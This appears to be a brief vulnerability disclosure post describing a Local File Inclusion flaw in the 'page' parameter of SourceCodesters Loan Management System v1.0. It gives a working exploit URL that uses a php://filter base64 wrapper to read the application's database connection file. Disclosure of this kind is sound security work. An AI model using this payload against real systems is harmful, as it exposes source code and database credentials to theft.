---
layout: post
title: 
tags: [CVE, LFI]
description: "Local File Inclusion (LFI) vulnerability in 'index.php', 'page' parameter of SourceCodesters Loan Management System v1.0."
---

## Local File Inclusion (LFI)

Local File Inclusion (LFI) vulnerability in 'index.php', 'page' parameter of SourceCodesters Loan Management System v1.0.

Vulnerable path : http://localhost/loan/index.php?page

### Exploitation :

#### Manually

```
http://localhost/loan/index.php?page=php://filter/convert.base64-encode/resource=db_connect
```



*More informations to come*